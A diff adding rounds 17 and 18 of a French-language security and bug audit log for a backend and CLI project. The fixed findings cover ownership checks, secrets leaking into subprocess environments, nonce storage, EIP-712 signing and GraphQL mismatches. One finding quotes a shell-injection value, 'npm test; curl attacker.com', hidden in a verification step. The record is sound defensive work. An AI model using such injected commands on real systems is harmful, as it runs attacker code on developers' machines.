@@ -1631,3 +1631,149 @@ Couvert par M2 ci-dessus.
 | Modifié | `frontend/src/mocks/data/auth.fixture.ts` (skills sur mockUser) |
 | Modifié | `frontend/src/types/graphql.ts` (skills sur UserProfile) |
 | Modifié | `frontend/src/lib/auth/authStore.ts` (skills depuis JWT payload) |
+
+---
+
+## ROUND 17 — Audit backend framework (2026-08-03) — 6 findings corrigés
+
+**Périmètre :** `backend/src/` + `cli/src/` — audit ciblé sur le refactor auth stateless (challenge-response EIP-712 sans email).**
+
+---
+
+### [B17-C1] validateSubmission : ownership check silencieusement ignoré
+**Fichier :** `backend/src/services/validation.service.ts:76`
+**Problème :** Le resolver GraphQL passait `ctx.user.ptfAddress` comme 2e argument à `validateSubmission(submissionId)`, mais l'interface et l'implémentation n'acceptaient qu'un seul paramètre. N'importe quel utilisateur authentifié pouvait déclencher l'exécution des commandes de vérification de n'importe quelle soumission (épuisement de ressources).
+**Correction :** Signature étendue `validateSubmission(submissionId: string, callerAddress?: string)`. Quand `callerAddress` est présent, vérification que c'est bien le project owner. Les appels internes (depuis `TaskService.submit`) passent sans `callerAddress`.
+
+---
+
+### [B17-C2] Subprocess hérite de tout l'env backend — secrets exposés
+**Fichier :** `backend/src/services/validation.service.ts:118`
+**Problème :** `execFileAsync(cmd, args, { env: { ...process.env } })` transmettait `DATABASE_URL`, `JWT_SECRET`, `BACKEND_PRIVATE_KEY` à chaque commande de vérification. Un project owner pouvait créer une step qui loggue les variables d'env — secrets stockés en clair dans `submission.testResults` et retournés via GraphQL.
+**Correction :** Environnement isolé : `{ CI: "true", PATH, HOME, TMPDIR }` uniquement. Aucun secret backend n'est transmis aux subprocessus.
+
+---
+
+### [B17-C3] Nonce store in-memory cassé en mode cluster production
+**Fichiers :** `backend/src/services/auth.service.ts`, `backend/src/container.ts`
+**Problème :** Le `nonceStore` était une `Map` module-level. En production cluster (1 worker par CPU), `requestChallenge` et `verifyChallenge` pouvaient atterrir sur des workers différents → authentification échouait aléatoirement (~75% des cas sur 4 CPUs).
+**Correction :** `AuthService` accepte maintenant un client Redis (obligatoire en production, `throw` si absent). Les nonces sont stockés dans Redis avec TTL (`nonce:val:<nonce>` → adresse, `nonce:addr:<address>` → nonce). Fallback in-memory conservé pour dev single-process uniquement. `container.ts` passe `redisSentinel` à `AuthService`.
+
+---
+
+### [B17-H1] EIP-712 ownership : signedNonce utilisé comme valeur ET comme signature
+**Fichier :** `backend/src/services/wallet.service.ts:65`
+**Problème :** `verifyEIP712Signature` appelé avec `{ value: signedNonce }` comme typed data et `signedNonce` comme signature — la même string pour les deux. La vérification d'ownership était toujours fausse quand `signedNonce` était fourni.
+**Correction :** Le typed data contient maintenant `{ value: address }` (l'adresse du wallet, qui est le message logique signé). La signature reste `signedNonce`. La sémantique est correcte : le client prouve qu'il possède l'adresse en signant celle-ci.
+
+---
+
+### [B17-H2] CLI `claimTask` : arguments incompatibles avec le schema GraphQL
+**Fichier :** `cli/src/utils/api.ts:291`
+**Problème :** La mutation CLI envoyait `claimTask(taskId, devAddress)` mais le schema déclare `claimTask(taskId: ID!, chain: String!, signedNonce: String)`. `devAddress` n'existe pas dans le schema, `chain` requis manquait → toutes les réclamations online échouaient silencieusement (fallback mock).
+**Correction :** Mutation corrigée : `claimTask(taskId: ID!, chain: String!)`. `chain` lu depuis `this.chain` (initialisé depuis `config.walletChain ?? "polygon"`). `devAddress` supprimé.
+
+---
+
+### [B17-H3] CLI `submitTask` : argument `branch` au lieu de `branchRef`
+**Fichier :** `cli/src/utils/api.ts:335`
+**Problème :** La mutation CLI envoyait `submitTask(taskId, branch, commitHash)` mais le schema déclare `submitTask(taskId: ID!, commitHash: String!, branchRef: String!)`. L'argument `branch` n'existe pas, `branchRef` requis était absent → toutes les soumissions online échouaient silencieusement.
+**Correction :** Mutation corrigée : `submitTask(taskId: ID!, commitHash: String!, branchRef: String!)`. Variable renommée `branchRef: branch` côté envoi. Retour mappé de `branchRef` vers `SubmitResult.branch`.
+
+---
+
+### [B17-BONUS] TimerService mal câblé — ValidationService absent
+**Fichier :** `backend/src/container.ts`
+**Problème :** `new TimerService(prisma, punishmentService, redisQueue)` — `redisQueue` était passé en 3e position alors que `TimerService` attend `IValidationService`. `autoApprove` (timer 72h silence propriétaire) ne s'exécutait jamais.
+**Correction :** `validationService` instancié avant `timerService` et passé en 3e argument. `redisQueue` en 4e.
+
+---
+
+### Statut global post-round 17
+
+| Sévérité | Round 17 | Total cumulé rounds 1–17 | Ouverts |
+|----------|----------|--------------------------|---------|
+| Critical | 3 | 8 | 0 |
+| High | 3 | 26 | 0 |
+| Medium | 1 (bonus câblage) | 26 | 0 |
+| **Total** | **7** | **60** | **0** |
+
+---
+
+## ROUND 18 — Audit commandes CLI (2026-08-04) — 9 findings corrigés
+
+**Périmètre :** `cli/src/commands/` — toutes les commandes. 9 bugs fonctionnels identifiés et corrigés. 0 ouverts.**
+
+---
+
+### [CLI18-1] `tasks preview` : instruction `--project` inexistante dans message d'erreur
+**Fichier :** `cli/src/commands/tasks.ts:165`
+**Problème :** Le message d'erreur "draft vide" indiquait `ptf generate --project <id>`, mais `generate` n'a pas d'option `--project` — il lit `.ptf/config.json` automatiquement.
+**Correction :** Message corrigé → `ptf generate`.
+
+---
+
+### [CLI18-2] `scaffold` : même fausse instruction `--project` dans les prochaines étapes
+**Fichier :** `cli/src/commands/scaffold.ts:97`
+**Problème :** Même bug que dans `init` (corrigé round 15) — `scaffold` affichait `ptf generate --project <projectId>`.
+**Correction :** `ptf generate --project <projectId>` → `ptf generate`.
+
+---
+
+### [CLI18-3] `tasks publish` : stub silencieux — aucun appel backend
+**Fichier :** `cli/src/commands/tasks.ts:309`
+**Problème :** `publish` calculait un Merkle root localement puis affichait "tâches publiées" après un `setTimeout(1500)`. Aucune mutation GraphQL. Les tâches n'étaient jamais persistées en base → `tasks list` retournait toujours 0.
+**Correction :** Appels réels : `createProject` (idempotent), `generateTasks`, `publishProject`. Abort explicite en mode offline avec message actionnable.
+
+---
+
+### [CLI18-4] `tasks mine` : filtre `--status` écrasé côté client
+**Fichier :** `cli/src/commands/tasks.ts:115`
+**Problème :** Après réception des tâches du serveur, le CLI refiltre en dur sur `['claimed','in_progress','submitted','under_review']`. `ptf tasks mine --status validated` retournait toujours vide même si des tâches validées existaient.
+**Correction :** Si `--status` est passé explicitement, le résultat serveur est utilisé tel quel. Sans `--status`, le filtre défensif sur les 4 statuts actifs est conservé (comportement par défaut).
+
+---
+
+### [CLI18-5] `contributors list` : query et champs incompatibles avec le schema backend
+**Fichier :** `cli/src/commands/projects.ts:169`
+**Problème :** La query utilisait `contributors(projectId)` avec des champs inexistants (`address`, `github`, `taskCount`, `reputation`, `level`). Le schema expose `projectContributors(projectId: ID!)` avec `devAddress`, `githubHandle`, `tasksCompleted`, `reputationScore`, `joinedAt`. La commande échouait systématiquement en mode connecté.
+**Correction :** Query et champs alignés sur le schema. Colonne "Depuis" ajoutée.
+
+---
+
+### [CLI18-6] `project claimed-tasks` : réputation hardcodée à `350 pts`
+**Fichier :** `cli/src/commands/projects.ts:129`
+**Problème :** La colonne Réputation affichait toujours "350 pts" pour tous les devs.
+**Correction :** Requête `reputationScore(address)` pour chaque adresse unique, en parallèle (`Promise.all`). Affiche le vrai score ou `—` en cas d'erreur.
+
+---
+
+### [CLI18-7] `wallet history` / `reputation-history` / `utxos` : mocks silencieux en mode connecté
+**Fichier :** `cli/src/commands/wallet.ts`
+**Problème :** Les queries `creditHistory`, `reputationHistory`, `utxos` n'existent pas dans le schema framework. Le `catch` silencieux affichait des données fictives sans banner offline — l'utilisateur croyait voir ses vraies données.
+**Correction :** Message explicite "disponible dans une prochaine version" avec lien vers `ptf wallet status`. Plus aucune donnée fictive affichée sans avertissement.
+
+---
+
+### [CLI18-8] `submit` : `execSync(string)` vulnérable à l'injection shell
+**Fichier :** `cli/src/commands/submit.ts:152`
+**Problème :** `execSync(step.command)` passe par `/bin/sh -c`. Un project owner malveillant peut injecter `npm test; curl attacker.com` dans une `verificationStep`. Contrairement au backend qui utilise `execFile`, le CLI était vulnérable.
+**Correction :** `execSync(string)` → `execFileSync(cmd, args)` avec découpage `command.split(/\s+/)`. Aucun shell intermédiaire — injection impossible.
+
+---
+
+### [CLI18-9] `report` : mutation `reportDeveloper` absente du schema GraphQL
+**Fichier :** `cli/src/commands/report.ts:84`
+**Problème :** La mutation `reportDeveloper` n'est pas dans le schema framework. La commande échouait systématiquement en mode connecté avec une GraphQL error.
+**Correction :** Message explicite "disponible dans une prochaine version" + affichage formaté du rapport pour envoi manuel via `support@ptf.dev`.
+
+---
+
+### Statut global post-round 18
+
+| Sévérité | Round 18 | Total cumulé rounds 1–18 | Ouverts |
+|----------|----------|--------------------------|---------|
+| Critical | 1 (stub publish) | 9 | 0 |
+| High | 3 (injection, schema mismatch×2) | 29 | 0 |
+| Medium | 5 (filtre, hardcode, mocks silencieux) | 31 | 0 |
+| **Total** | **9** | **69** | **0** |
